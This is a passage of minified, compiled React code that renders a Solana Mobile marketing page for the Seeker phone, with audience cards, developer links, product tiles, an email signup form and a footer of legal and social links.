						children: [
							f.jsxs("div", {
								className:
									"flex flex-col gap-6 rounded-2xl bg-web p-5 md:rounded-7.5 md:p-8 lg:max-w-[317px]",
								children: [
									f.jsx("p", {
										className:
											"text-xs tracking-[1.08px] uppercase font-normal text-nimbus",
										children: "Developers",
									}),
									f.jsx("p", {
										className:
											"text-xs tracking-[-0.36px] font-normal text-white",
										children:
											"Build without restrictions. Keep what you earn.",
									}),
									f.jsx("p", {
										className:
											"text-xs leading-[120%] tracking-[-0.32px] font-normal text-nimbus",
										children:
											"Create the dApps you envision without gatekeepers standing in your way.",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"flex flex-col gap-6 rounded-2xl bg-web p-5 md:rounded-7.5 md:p-8 lg:max-w-[317px]",
								children: [
									f.jsx("p", {
										className:
											"text-xs tracking-[1.08px] uppercase font-normal text-nimbus",
										children: "Users",
									}),
									f.jsx("p", {
										className:
											"text-xs tracking-[-0.36px] font-normal text-white",
										children:
											"Own your experience. Share in the value you help create.",
									}),
									f.jsx("p", {
										className:
											"text-xs leading-[120%] tracking-[-0.32px] font-normal text-nimbus",
										children:
											"Become a power user with exclusive incentives and access.",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"flex flex-col gap-6 rounded-2xl bg-web p-5 md:rounded-7.5 md:p-8 lg:max-w-[317px]",
								children: [
									f.jsx("p", {
										className:
											"text-xs tracking-[1.08px] uppercase font-normal text-nimbus",
										children: "Hardware Manufacturers",
									}),
									f.jsx("p", {
										className:
											"text-xs tracking-[-0.36px] font-normal text-white",
										children:
											"An open gateway to web3 mobile.",
									}),
									f.jsx("p", {
										className:
											"text-xs leading-[120%] tracking-[-0.32px] font-normal text-nimbus",
										children:
											"OEMs can adopt the Solana Mobile platform on new devices.",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"flex flex-col gap-6 rounded-2xl bg-web p-5 md:rounded-7.5 md:p-8 lg:max-w-[317px]",
								children: [
									f.jsx("p", {
										className:
											"text-xs tracking-[1.08px] uppercase font-normal text-nimbus",
										children: "Guardians",
									}),
									f.jsx("p", {
										className:
											"text-xs tracking-[-0.36px] font-normal text-white",
										children:
											"Verify devices and applications, ensure platform integrity.",
									}),
									f.jsx("p", {
										className:
											"text-xs leading-[120%] tracking-[-0.32px] font-normal text-nimbus",
										children:
											"Community leaders that validate and verify the network.",
									}),
								],
							}),
						],
					}),
					f.jsx("div", {
						className:
							"relative order-1 h-[300px] w-full overflow-hidden rounded-7.5 bg-web xs:h-[550px] min-[1420px]:order-2",
						children: f.jsx("video", {
							className:
								"absolute inset-0 size-full rounded-7.5 object-contain min-[1420px]:object-cover",
							autoPlay: !0,
							loop: !0,
							playsInline: !0,
							children: f.jsx("source", {
								src: "/flywheel.mp4",
								type: "video/mp4",
							}),
						}),
					}),
				],
			}),
		],
	});
}
function y4() {
	return f.jsxs("div", {
		className:
			" mx-24 my-24 grid overflow-hidden rounded-xl bg-web md:grid-cols-2",
		children: [
			f.jsxs("div", {
				className:
					"order-2 flex flex-col justify-between gap-10 p-5 md:p-15 lg:order-1",
				children: [
					f.jsxs("div", {
						className: "flex flex-col gap-6",
						children: [
							f.jsx("h4", {
								className:
									"text-[36.4px] md:text-[52px] leading-[99%] font-normal text-sky",
								children: "Developers",
							}),
							f.jsx("p", {
								className:
									"text-[18px] tracking-[-0.36px] font-normal text-sky lg:max-w-[402px]",
								children:
									"Solana Mobile supports the growth of web3 mobile through hackathons and builder grants for projects developing innovative mobile experiences, advancing infrastructure, and expanding the ecosystem.",
							}),
						],
					}),
					f.jsxs("div", {
						className: "flex flex-col gap-4",
						children: [
							f.jsx("a", {
								target: "_blank",
								href: "https://docs.solanamobile.com/",
								children: f.jsxs("span", {
									className:
										"flex items-center gap-2 text-brand-sea-glass hover:text-brand-aquamarine",
									children: [
										f.jsx("span", {
											className:
												"text-[24px] font-semibold tracking-[-0.48px] text-nimbus",
											children: "Mobile Developer Docs",
										}),
										f.jsx("svg", {
											width: "25",
											height: "25",
											viewBox: "0 0 25 25",
											fill: "none",
											xmlns: "http://www.w3.org/2000/svg",
											children: f.jsx("path", {
												d: "M19.4743 6.36279V16.1128C19.4743 16.262 19.415 16.4051 19.3095 16.5105C19.204 16.616 19.0609 16.6753 18.9118 16.6753C18.7626 16.6753 18.6195 16.616 18.514 16.5105C18.4085 16.4051 18.3493 16.262 18.3493 16.1128V7.72029L7.30925 18.7603C7.20262 18.8597 7.06158 18.9137 6.91586 18.9112C6.77013 18.9086 6.63109 18.8496 6.52803 18.7465C6.42497 18.6434 6.36594 18.5044 6.36337 18.3587C6.3608 18.213 6.41489 18.0719 6.51425 17.9653L17.5543 6.92529H9.16175C9.01257 6.92529 8.86949 6.86603 8.764 6.76054C8.65851 6.65505 8.59925 6.51198 8.59925 6.36279C8.59925 6.21361 8.65851 6.07053 8.764 5.96505C8.86949 5.85956 9.01257 5.80029 9.16175 5.80029H18.9118C19.0609 5.80029 19.204 5.85956 19.3095 5.96505C19.415 6.07053 19.4743 6.21361 19.4743 6.36279Z",
												fill: "#CFE6E4",
											}),
										}),
									],
								}),
							}),
							f.jsx("a", {
								target: "_blank",
								href: "/hackathon",
								children: f.jsxs("span", {
									className:
										"flex items-center gap-2 text-brand-sea-glass hover:text-brand-aquamarine",
									children: [
										f.jsx("span", {
											className:
												"text-[24px] font-semibold tracking-[-0.48px] text-nimbus",
											children: "Hackathon",
										}),
										f.jsx("svg", {
											width: "25",
											height: "25",
											viewBox: "0 0 25 25",
											fill: "none",
											xmlns: "http://www.w3.org/2000/svg",
											children: f.jsx("path", {
												d: "M19.4743 6.36279V16.1128C19.4743 16.262 19.415 16.4051 19.3095 16.5105C19.204 16.616 19.0609 16.6753 18.9118 16.6753C18.7626 16.6753 18.6195 16.616 18.514 16.5105C18.4085 16.4051 18.3493 16.262 18.3493 16.1128V7.72029L7.30925 18.7603C7.20262 18.8597 7.06158 18.9137 6.91586 18.9112C6.77013 18.9086 6.63109 18.8496 6.52803 18.7465C6.42497 18.6434 6.36594 18.5044 6.36337 18.3587C6.3608 18.213 6.41489 18.0719 6.51425 17.9653L17.5543 6.92529H9.16175C9.01257 6.92529 8.86949 6.86603 8.764 6.76054C8.65851 6.65505 8.59925 6.51198 8.59925 6.36279C8.59925 6.21361 8.65851 6.07053 8.764 5.96505C8.86949 5.85956 9.01257 5.80029 9.16175 5.80029H18.9118C19.0609 5.80029 19.204 5.85956 19.3095 5.96505C19.415 6.07053 19.4743 6.21361 19.4743 6.36279Z",
												fill: "#CFE6E4",
											}),
										}),
									],
								}),
							}),
							f.jsx("a", {
								target: "_blank",
								href: "https://solanamobile.com/grants",
								children: f.jsxs("span", {
									className:
										"flex items-center gap-2 text-brand-sea-glass hover:text-brand-aquamarine",
									children: [
										f.jsx("span", {
											className:
												"text-[24px] font-semibold tracking-[-0.48px] text-nimbus",
											children: "Builder Grants",
										}),
										f.jsx("svg", {
											width: "25",
											height: "25",
											viewBox: "0 0 25 25",
											fill: "none",
											xmlns: "http://www.w3.org/2000/svg",
											children: f.jsx("path", {
												d: "M19.4743 6.36279V16.1128C19.4743 16.262 19.415 16.4051 19.3095 16.5105C19.204 16.616 19.0609 16.6753 18.9118 16.6753C18.7626 16.6753 18.6195 16.616 18.514 16.5105C18.4085 16.4051 18.3493 16.262 18.3493 16.1128V7.72029L7.30925 18.7603C7.20262 18.8597 7.06158 18.9137 6.91586 18.9112C6.77013 18.9086 6.63109 18.8496 6.52803 18.7465C6.42497 18.6434 6.36594 18.5044 6.36337 18.3587C6.3608 18.213 6.41489 18.0719 6.51425 17.9653L17.5543 6.92529H9.16175C9.01257 6.92529 8.86949 6.86603 8.764 6.76054C8.65851 6.65505 8.59925 6.51198 8.59925 6.36279C8.59925 6.21361 8.65851 6.07053 8.764 5.96505C8.86949 5.85956 9.01257 5.80029 9.16175 5.80029H18.9118C19.0609 5.80029 19.204 5.85956 19.3095 5.96505C19.415 6.07053 19.4743 6.21361 19.4743 6.36279Z",
												fill: "#CFE6E4",
											}),
										}),
									],
								}),
							}),
						],
					}),
				],
			}),
			f.jsx("div", {
				className: "relative order-1 h-[400px] lg:order-2 lg:h-[541px]",
				children: f.jsx("div", {
					className: "absolute left-[8%] size-full",
					children: f.jsx("img", {
						alt: "Solution Illustration",
						loading: "lazy",
						decoding: "async",
						src: "/solution-illustration.webp",
						style: {
							position: "absolute",
							height: "100%",
							width: "100%",
							inset: "0px",
							objectFit: "cover",
							color: "transparent",
						},
					}),
				}),
			}),
		],
	});
}
function b4() {
	const [c, d] = A.useState(!1),
		o = () => d(!0),
		r = () => d(!1);
	return f.jsxs("div", {
		className:
			"mb-15 mt-[70px] flex flex-col gap-10 md:mb-[140px] md:mt-[120px]",
		children: [
			f.jsxs("div", {
				className: "mx-auto flex flex-col items-center gap-8",
				children: [
					f.jsx("img", {
						alt: "Seeker",
						loading: "lazy",
						width: "336",
						height: "82",
						decoding: "async",
						style: { color: "transparent" },
						src: "/seeker2.svg",
					}),
					f.jsx("h5", {
						className:
							"text-[29.4px] md:text-[42px] leading-[99%] font-normal text-center text-sky",
						children: "The Definitive Web3 Mobile Device",
					}),
					f.jsxs("span", {
						className: "flex gap-4",
						children: [
							f.jsx("button", {
								className:
									"inline-flex items-center justify-center whitespace-nowrap text-black bg-nimbus hover:bg-white transition duration-300 ease-in-out  rounded-full font-normal px-6 py-3 text-[16px] tracking-[-0.48px] md:py-4 md:text-[24px]",
								onClick: o,
								children: "Order Now",
							}),
							f.jsx("button", {
								className:
									"inline-flex items-center justify-center whitespace-nowrap  transition duration-300 ease-in-out  disabled:cursor-not-allowed border border-nimbus text-nimbus hover:bg-white hover:text-black rounded-full font-normal px-6 py-3 text-[16px]  md:py-4 md:text-[24px]",
								onClick: o,
								children: "Learn More",
							}),
						],
					}),
				],
			}),
			f.jsxs("div", {
				className: "grid gap-8 min-[1400px]:grid-cols-[1fr_502px] mx-8",
				children: [
					f.jsxs("div", {
						className:
							"order-2 grid grid-cols-2 gap-4 md:gap-8 lg:order-1",
						children: [
							f.jsxs("div", {
								className:
									"grid h-[220px] grid-rows-[1fr_81px] gap-6 sm:h-[320px] md:grid-rows-[1fr_min-content] min-[1400px]:w-[379px]",
								children: [
									f.jsx("div", {
										className:
											"relative size-full overflow-hidden rounded-2xl bg-web-gray-1 md:rounded-7.5",
										children: f.jsx("video", {
											className:
												"absolute inset-0 size-full object-cover",
											autoPlay: !0,
											loop: !0,
											muted: !0,
											playsInline: !0,
											children: f.jsx("source", {
												src: "/seeker-genesis-final.mp4",
												type: "video/mp4",
											}),
										}),
									}),
									f.jsx("p", {
										className:
											"text-[18px] tracking-[-0.36px] font-normal text-sky sm:h-auto",
										children: "Solana Seeker Genesis Token",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"grid h-[220px] grid-rows-[1fr_81px] gap-6 sm:h-[320px] md:grid-rows-[1fr_min-content] min-[1400px]:w-[379px]",
								children: [
									f.jsx("div", {
										className:
											"relative size-full overflow-hidden rounded-2xl bg-web-gray-1 md:rounded-7.5",
										children: f.jsx("img", {
											alt: "dApp Store UI",
											loading: "lazy",
											decoding: "async",
											style: {
												position: "absolute",
												height: "100%",
												width: "100%",
												left: "0",
												top: "0",
												right: "0",
												bottom: "0",
												objectFit: "contain",
												color: "transparent",
											},
											sizes: "(max-width: 768px) 100vw, 30vw",
											src: "/skr-tokens.png",
										}),
									}),
									f.jsx("p", {
										className:
											"text-[18px] tracking-[-0.36px] font-normal text-sky sm:h-auto",
										children:
											"SKR tokens go directly to builders & users",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"grid h-[220px] grid-rows-[1fr_81px] gap-6 sm:h-[320px] md:grid-rows-[1fr_min-content] min-[1400px]:w-[379px]",
								children: [
									f.jsx("div", {
										className:
											"relative size-full overflow-hidden rounded-2xl bg-web-gray-1 md:rounded-7.5",
										children: f.jsx("img", {
											alt: "SeedVault",
											loading: "lazy",
											decoding: "async",
											className:
												"absolute bottom-0 right-0",
											style: {
												position: "absolute",
												height: "100%",
												width: "100%",
												left: "0",
												top: "0",
												right: "0",
												bottom: "0",
												objectFit: "cover",
												color: "transparent",
											},
											sizes: "(max-width: 768px) 100vw, 30vw",
											src: "/seedvault.webp",
										}),
									}),
									f.jsx("p", {
										className:
											"text-[18px] tracking-[-0.36px] font-normal text-sky sm:h-auto",
										children: "Seed Vault Wallet",
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"grid h-[220px] grid-rows-[1fr_81px] gap-6 sm:h-[320px] md:grid-rows-[1fr_min-content] min-[1400px]:w-[379px]",
								children: [
									f.jsx("div", {
										className:
											"relative size-full overflow-hidden rounded-2xl bg-web-gray-1 md:rounded-7.5",
										children: f.jsx("video", {
											className:
												"absolute inset-0 size-full object-cover",
											autoPlay: !0,
											loop: !0,
											muted: !0,
											playsInline: !0,
											children: f.jsx("source", {
												src: "/seeker-card.mp4",
												type: "video/mp4",
											}),
										}),
									}),
									f.jsx("p", {
										className:
											"text-[18px] tracking-[-0.36px] font-normal text-sky sm:h-auto",
										children: "Seeker ID",
									}),
								],
							}),
						],
					}),
					f.jsxs("div", {
						className: "order-1 flex flex-col gap-6 lg:order-2",
						children: [
							f.jsx("div", {
								className:
									"relative flex size-full overflow-hidden rounded-3xl bg-web max-[1400px]:h-[585px]",
								children: f.jsx("img", {
									alt: "dApp Store UI",
									loading: "lazy",
									decoding: "async",
									style: {
										position: "absolute",
										height: "100%",
										width: "100%",
										left: "0",
										top: "0",
										right: "0",
										bottom: "0",
										objectFit: "contain",
										color: "transparent",
									},
									sizes: "(max-width: 768px) 100vw, 30vw",
									src: "/dapp-store.webp",
								}),
							}),
							f.jsx("p", {
								className:
									"text-[18px] tracking-[-0.36px] font-normal text-sky ",
								children: "100+ apps in the Solana dApp Store",
							}),
						],
					}),
				],
			}),
			f.jsx(zc, { isOpen: c, onClose: r }),
		],
	});
}
function C4() {
	return f.jsxs("div", {
		className:
			"mx-auto flex w-full flex-col items-center justify-between gap-[30px] rounded-2xl p-[30px] bg-blend-overlay md:p-[60px] lg:flex-row",
		style: {
			background:
				"radial-gradient(179% 193.67% at 26.88% 140.12%, rgba(0, 0, 0, 0.20) 0%, rgba(21, 107, 97, 0.20) 27.5%, rgba(82, 147, 139, 0.20) 36%, rgba(193, 229, 214, 0.20) 68%, rgba(252, 253, 247, 0.20) 100%), #99B3BE",
		},
		children: [
			f.jsxs("div", {
				className: "flex max-w-[366px] flex-col gap-[15px]",
				children: [
					f.jsx("p", {
						className:
							"text-[44.8px] md:text-[64px] tracking-[-0.448px] md:tracking-[-0.64px] leading-[99%] font-normal text-black",
						children: "Stay Tuned",
					}),
					f.jsx("p", {
						className:
							"text-[18px] tracking-[-0.36px] font-normal text-black",
						children:
							"Get the latest updates on Solana Mobile and Seeker directly to your inbox.",
					}),
				],
			}),
			f.jsxs("div", {
				className:
					"flex max-w-[519px] flex-col items-center gap-[30px] text-center",
				children: [
					f.jsxs("div", {
						className: "flex w-full flex-col gap-[15px]",
						children: [
							f.jsxs("form", {
								className:
									"grid w-full gap-4 md:grid-cols-[1fr_max-content]",
								action: "",
								enctype: "multipart/form-data",
								method: "POST",
								children: [
									f.jsx("input", {
										type: "hidden",
										name: "$ACTION_REF_1",
									}),
									f.jsx("input", {
										type: "hidden",
										name: "$ACTION_1:0",
										value: '{"id":"14412f893248708f2e1cac3af87aea9798cb7a32","bound":"$@1"}',
									}),
									f.jsx("input", {
										type: "hidden",
										name: "$ACTION_1:1",
										value: '[{"message":"","error":true}]',
									}),
									f.jsx("input", {
										type: "hidden",
										name: "$ACTION_KEY",
										value: "k3130512829",
									}),
									f.jsx("input", {
										required: "",
										type: "email",
										placeholder: "Email",
										className:
											"w-full rounded-2xl p-5 text-[18px] leading-[120%] tracking-[-0.36px] outline-none bg-white text-black",
										name: "email",
									}),
									f.jsx("button", {
										className:
											"inline-flex items-center justify-center whitespace-nowrap font-semibold transition-colors duration-300 ease-in-out focus-visible:outline-none disabled:cursor-not-allowed bg-black text-white hover:bg-web-gray-1 focus:bg-brand-adriatic/60 rounded-2xl px-[30px] py-[15px] text-[18px] tracking-[-0.36px]",
										type: "submit",
										children: "Get Updates",
									}),
								],
							}),
							f.jsx("p", {
								className:
									"text-[16px] leading-[120%] tracking-[-0.32px] font-normal text-black",
							}),
						],
					}),
					f.jsxs("p", {
						className:
							"text-[16px] leading-[120%] tracking-[-0.32px] font-normal text-black",
						children: [
							"You agree to be contacted by Solana Mobile and have read our ",
							f.jsx("a", {
								target: "_blank",
								href: "/privacy-policy-homepage-web",
								children: "Privacy Policy",
							}),
							".",
						],
					}),
				],
			}),
		],
	});
}
function S4() {
	return f.jsxs("footer", {
		className: "p-5 pt-[30px]",
		children: [
			f.jsxs("div", {
				className:
					"mb-[15px] flex flex-wrap items-center justify-center gap-[15px] border-b-4 border-webs pb-[15px] xl:gap-[19px] text-white",
				children: [
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/press",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Press Kit",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/tos-homepage-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Terms of Service",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/privacy-policy-homepage-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Privacy Policy",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/tos-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Terms of Sale",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/return-policy-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Return Policy",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "https://legal.solanamobile.com/en/seeker-warranty",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Warranty",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/cookie-policy-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Cookie Policy",
						}),
					}),
					f.jsx("a", {
						href: "#",
						className:
							"ot-sdk-show-settings text-center text-[18px]",
						style: { color: "#f6f6f5;text-decoration:none" },
						children: "Cookies Settings",
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/deposit-waitlist-agreement-web",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Deposit Agreement",
						}),
					}),
					f.jsx("a", {
						className: "text-center",
						target: "_blank",
						href: "/support",
						children: f.jsx("p", {
							className:
								"text-[18px] tracking-[-0.36px] font-normal",
							children: "Support",
						}),
					}),
				],
			}),
			f.jsxs("div", {
				className:
					"flex items-center justify-between gap-[30px] text-center",
				children: [
					f.jsx("p", {
						className:
							"text-[18px] tracking-[-0.36px] font-normal text-white",
						children: "© 2025S Solana Mobile Inc.",
					}),
					f.jsxs("span", {
						className: "flex gap-[15px]",
						children: [
							f.jsx("a", {
								target: "_blank",
								href: "https://discord.gg/solanamobile",
								children: f.jsx("svg", {
									width: "24",
									height: "25",
									viewBox: "0 0 24 25",
									fill: "none",
									xmlns: "http://www.w3.org/2000/svg",
									children: f.jsx("path", {
										d: "M23.2037 17.2021L20.4372 6.29059C20.3644 6.00652 20.2103 5.74986 19.9938 5.55204C19.7774 5.35422 19.5079 5.22383 19.2184 5.17684L15.8378 4.62184C15.4651 4.5619 15.0835 4.64271 14.7671 4.84856C14.4507 5.05441 14.2221 5.37059 14.1259 5.73559L14.1062 5.81528C14.0935 5.8659 14.0915 5.91864 14.1003 5.97009C14.1091 6.02155 14.1285 6.07061 14.1574 6.11411C14.1862 6.15762 14.2239 6.19462 14.2679 6.22275C14.3118 6.25088 14.3612 6.26952 14.4128 6.27746C15.1885 6.39131 15.9538 6.56751 16.7012 6.80434C16.8881 6.86072 17.0465 6.98605 17.1444 7.15493C17.2422 7.3238 17.2721 7.52357 17.2281 7.71371C17.2028 7.8128 17.1575 7.90566 17.095 7.9866C17.0325 8.06753 16.9541 8.13483 16.8646 8.18435C16.7752 8.23388 16.6765 8.26458 16.5747 8.27457C16.4729 8.28456 16.3702 8.27364 16.2728 8.24246C13.4995 7.39195 10.5355 7.38868 7.76031 8.23309C7.5725 8.29624 7.36758 8.28462 7.18812 8.20064C7.00865 8.11667 6.86842 7.9668 6.79656 7.78215C6.7624 7.6874 6.74768 7.58674 6.75327 7.48618C6.75885 7.38562 6.78464 7.28721 6.82909 7.19683C6.87354 7.10645 6.93573 7.02594 7.01197 6.96012C7.0882 6.8943 7.17691 6.84451 7.27281 6.81371C8.02956 6.57267 8.80459 6.39334 9.59031 6.27746C9.64191 6.26952 9.69128 6.25088 9.73526 6.22275C9.77924 6.19462 9.81687 6.15762 9.84572 6.11411C9.87458 6.07061 9.89404 6.02155 9.90284 5.97009C9.91165 5.91864 9.90962 5.8659 9.89687 5.81528L9.87718 5.73559C9.78095 5.37027 9.55209 5.0539 9.23525 4.84816C8.91841 4.64242 8.5363 4.56207 8.16343 4.62278L4.78093 5.17778C4.49159 5.22469 4.22221 5.35495 4.00575 5.55259C3.78929 5.75023 3.63514 6.0067 3.56218 6.29059L0.795618 17.2021C0.708874 17.5451 0.746626 17.9078 0.902159 18.2255C1.05769 18.5433 1.32092 18.7956 1.64499 18.9375L7.92624 21.7228C8.11511 21.8067 8.31916 21.8512 8.52584 21.8534C8.73252 21.8556 8.93747 21.8155 9.12809 21.7356C9.31872 21.6557 9.49099 21.5377 9.63432 21.3888C9.77765 21.2399 9.88901 21.0632 9.96156 20.8696L10.2887 19.9837C10.3082 19.9306 10.3155 19.8739 10.3099 19.8176C10.3044 19.7613 10.2862 19.7071 10.2567 19.6588C10.2272 19.6106 10.1872 19.5696 10.1397 19.539C10.0921 19.5084 10.0383 19.489 9.98218 19.4822C9.07144 19.3719 8.17289 19.1773 7.29812 18.9009C7.11204 18.8443 6.95431 18.7194 6.85671 18.5511C6.75912 18.3829 6.72891 18.1839 6.77218 17.9943C6.79726 17.895 6.84243 17.8018 6.90492 17.7206C6.9674 17.6394 7.04587 17.5718 7.13547 17.5221C7.22508 17.4724 7.32392 17.4415 7.42591 17.4315C7.52789 17.4214 7.63085 17.4324 7.72843 17.4637C10.5121 18.3162 13.4872 18.3162 16.2709 17.4637C16.3684 17.4326 16.4712 17.4217 16.573 17.4317C16.6748 17.4418 16.7735 17.4725 16.863 17.5222C16.9525 17.5718 17.0309 17.6392 17.0934 17.7202C17.1558 17.8013 17.201 17.8942 17.2262 17.9934C17.27 18.1832 17.24 18.3825 17.1424 18.551C17.0447 18.7194 16.8867 18.8445 16.7003 18.9009C15.8259 19.1774 14.9276 19.372 14.0172 19.4822C13.9611 19.489 13.9072 19.5084 13.8597 19.539C13.8121 19.5696 13.7721 19.6106 13.7426 19.6588C13.7132 19.7071 13.695 19.7613 13.6894 19.8176C13.6839 19.8739 13.6911 19.9306 13.7106 19.9837L14.0378 20.8696C14.1105 21.0631 14.2219 21.2397 14.3652 21.3885C14.5086 21.5374 14.6808 21.6554 14.8714 21.7352C15.062 21.8151 15.2669 21.8552 15.4736 21.8531C15.6802 21.8509 15.8842 21.8066 16.0731 21.7228L22.3544 18.9375C22.6784 18.7956 22.9417 18.5433 23.0972 18.2255C23.2527 17.9078 23.2905 17.5451 23.2037 17.2021ZM8.62468 15.1031C8.40218 15.1031 8.18467 15.0371 7.99966 14.9135C7.81466 14.7899 7.67046 14.6142 7.58532 14.4086C7.50017 14.203 7.47789 13.9768 7.5213 13.7586C7.56471 13.5404 7.67185 13.3399 7.82919 13.1826C7.98652 13.0253 8.18698 12.9181 8.4052 12.8747C8.62343 12.8313 8.84963 12.8536 9.0552 12.9387C9.26077 13.0239 9.43647 13.1681 9.56008 13.3531C9.6837 13.5381 9.74968 13.7556 9.74968 13.9781C9.74968 14.2765 9.63116 14.5626 9.42018 14.7736C9.2092 14.9846 8.92305 15.1031 8.62468 15.1031ZM15.3747 15.1031C15.1522 15.1031 14.9347 15.0371 14.7497 14.9135C14.5647 14.7899 14.4205 14.6142 14.3353 14.4086C14.2502 14.203 14.2279 13.9768 14.2713 13.7586C14.3147 13.5404 14.4219 13.3399 14.5792 13.1826C14.7365 13.0253 14.937 12.9181 15.1552 12.8747C15.3734 12.8313 15.5996 12.8536 15.8052 12.9387C16.0108 13.0239 16.1865 13.1681 16.3101 13.3531C16.4337 13.5381 16.4997 13.7556 16.4997 13.9781C16.4997 14.2765 16.3812 14.5626 16.1702 14.7736C15.9592 14.9846 15.673 15.1031 15.3747 15.1031Z",
										fill: "#FAF9F4",
									}),
								}),
							}),
							f.jsx("a", {
								target: "_blank",
								href: "https://x.com/solanamobile",
								children: f.jsx("svg", {
									width: "24",
									height: "25",
									viewBox: "0 0 24 25",
									fill: "none",
									xmlns: "http://www.w3.org/2000/svg",
									children: f.jsx("path", {
										d: "M20.1566 21.4645C20.092 21.5821 19.9971 21.6802 19.8817 21.7487C19.7662 21.8171 19.6346 21.8533 19.5004 21.8535H15.0004C14.8741 21.8535 14.75 21.8216 14.6393 21.7608C14.5287 21.7 14.4352 21.6122 14.3676 21.5057L10.5716 15.5404L5.05536 21.6079C4.92089 21.7523 4.7349 21.838 4.53772 21.8462C4.34054 21.8544 4.14805 21.7846 4.002 21.6519C3.85595 21.5192 3.7681 21.3342 3.7575 21.1372C3.74689 20.9401 3.81439 20.7468 3.94536 20.5991L9.7363 14.2241L3.86755 5.00664C3.79527 4.89324 3.75481 4.7625 3.7504 4.6281C3.746 4.4937 3.7778 4.36058 3.8425 4.24269C3.90719 4.1248 4.0024 4.02648 4.11813 3.95801C4.23387 3.88954 4.36589 3.85345 4.50036 3.85352H9.00036C9.12659 3.85355 9.25077 3.88545 9.36139 3.94625C9.472 4.00705 9.56549 4.09479 9.63318 4.20133L13.4291 10.1666L18.9454 4.09914C19.0798 3.95469 19.2658 3.86906 19.463 3.86082C19.6602 3.85259 19.8527 3.9224 19.9987 4.05513C20.1448 4.18786 20.2326 4.37281 20.2432 4.56988C20.2538 4.76695 20.1863 4.96026 20.0554 5.10789L14.2644 11.4782L20.1332 20.7013C20.2051 20.8148 20.2451 20.9454 20.2493 21.0797C20.2534 21.2139 20.2214 21.3468 20.1566 21.4645Z",
										fill: "#FAF9F4",
									}),
								}),
							}),
						],
					}),
				],
			}),
		],
	});
}
function E4() {
	return f.jsxs("div", {
		children: [
			f.jsx(m4, {}),
			f.jsx(p4, {}),
			f.jsx(x4, {}),
			f.jsx(g4, {}),
			f.jsx(v4, {}),
			f.jsx(y4, {}),
			f.jsx(b4, {}),
			f.jsx(C4, {}),
			f.jsx(S4, {}),
		],
	});
}
function j4() {
	return f.jsx(F3, {
		children: f.jsx(w3, {
			children: f.jsx(P2, { path: "/", element: f.jsx(E4, {}) }),
		}),
	});
}
L0.createRoot(document.getElementById("root")).render(
	f.jsx(A.StrictMode, { children: f.jsx(j4, {}) })
);
